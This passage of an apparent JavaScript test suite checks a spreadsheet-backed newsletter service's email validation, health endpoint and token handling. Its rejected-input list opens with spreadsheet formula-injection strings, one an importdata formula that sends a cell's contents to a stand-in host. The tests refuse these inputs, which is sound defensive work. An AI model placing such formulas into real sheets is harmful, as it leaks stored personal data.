      '=importdata("https://x.example/?a@b.c"&a2)', '=1+1@x.io', '+cmd@x.io', '-2+3@x.io', '@sum@x.io',
      'a"b@x.io', 'a(b)@x.io', 'a@x.io\n=1+1', 'a@x.io\t=1+1', 'a@x.io, b@y.io', 'a b@x.io', 'a@b', 'plain', `${'a'.repeat(250)}@x.io`,
    ]) {
      assert.deepEqual(sub(ctx, { email }), { ok: false, error: 'invalid_email' }, email);
    }
    assert.deepEqual(emails(ctx), []);
    assert.deepEqual(ctx.rec.mails, []);
    // White space around an address is trimmed, as it always was.
    assert.deepEqual(sub(ctx, { email: ' Reader@x.io\n' }), { ok: true });
    assert.deepEqual(emails(ctx), ['reader@x.io']);
  });

  it('still takes ordinary addresses, tags, subdomains and other scripts', () => {
    const ctx = load();
    const good = ['a@x.io', 'first.last+tag@mail.example.co.uk', 'user_name-1@sub-domain.example.org', "o'brien@example.ie", 'रमेश@उदाहरण.भारत', 'jörg@müller.de'];
    for (const email of good) assert.deepEqual(sub(ctx, { email }), { ok: true }, email);
    assert.deepEqual(emails(ctx), good);
  });

  it('health says ok or not, and nothing about the sheet or the account', () => {
    const ctx = load([row('a@x.io', 'confirmed', 3, { unsub: tok('1') })]);
    Object.assign(ctx.rec.props, { FROM_NAME: 'nidhi', SITE_URL: 'https://nidhi.today' });
    const out = json(ctx.doGet(req({ action: 'health' })));
    assert.deepEqual(out, { ok: true, checks: {
      script_properties: { ok: true }, web_app_url: { ok: true }, gmail_advanced_service: { ok: true },
      sheet_access: { ok: true }, from_email_sendable: { ok: true },
    } });
    // Nothing but the check names: no address, no sheet name or size, no web app address.
    assert.doesNotMatch(JSON.stringify(out), /@|nidhi|rows|example\.invalid|"tab"/i);
  });

  it('a failing check, and any other error, says nothing about why', () => {
    const ctx = load();
    ctx.rec.props.FROM_EMAIL = 'someone-else@example.com';
    const health = json(ctx.doGet(req({ action: 'health' })));
    assert.deepEqual(health.checks.from_email_sendable, { ok: false });
    assert.equal(health.ok, false);
    assert.doesNotMatch(JSON.stringify(health), /someone-else|updates@|alias/i);

    delete ctx.rec.props.SHEET_ID;
    const post = ctx.doPost(req({ action: 'subscribe', email: 'a@x.io' }));
    assert.deepEqual(json(post), { ok: false, error: 'error' });
    const get = ctx.doGet(req({ action: 'confirm', t: tok('1') }));
    assert.doesNotMatch(get.html, /SHEET_ID|script property|Missing/);
    assert.match(get.html, /Something went wrong/);
  });

  it('send_post does not name the account when its address cannot send', () => {
    const ctx = load([row('a@x.io', 'confirmed', 3, { unsub: tok('1') })]);
    ctx.rec.props.FROM_EMAIL = 'someone-else@example.com';
    const body = JSON.stringify({ guid: 'g', subject: 'S', html: 'h', text: 't' });
    assert.deepEqual(json(ctx.doPost(req({ action: 'send_post', sig: sign(body) }, body))), { ok: false, error: 'from_email_not_sendable' });
  });

  it('the count token is read from the body only, and not hashed when too long', () => {
    const TOKEN = 'a-test-count-token';
    const ctx = load([row('a@x.io', 'confirmed', 3, { unsub: tok('1') }), row('b@x.io', 'pending', 1, { confirm: tok('2') })]);
    vm.runInContext(`COUNT_TOKEN_SHA256_ = '${crypto.createHash('sha256').update(TOKEN).digest('hex')}';`, ctx);
    const inBody = (fields) => ({ parameter: fields, postData: { contents: new URLSearchParams(fields).toString() } });
    assert.deepEqual(json(ctx.doPost(inBody({ action: 'count', token: TOKEN }))), { ok: true, count: 1 });
    // In the address only: refused.
    assert.deepEqual(json(ctx.doPost({ parameter: { action: 'count', token: TOKEN }, postData: { contents: 'action=count' } })), { ok: false, error: 'forbidden' });
    let hashed = 0;
    const digest = ctx.Utilities.computeDigest;
    ctx.Utilities.computeDigest = (...a) => { hashed++; return digest(...a); };
    assert.deepEqual(json(ctx.doPost(inBody({ action: 'count', token: 'x'.repeat(129) }))), { ok: false, error: 'forbidden' });
    assert.equal(hashed, 0);
  });
});
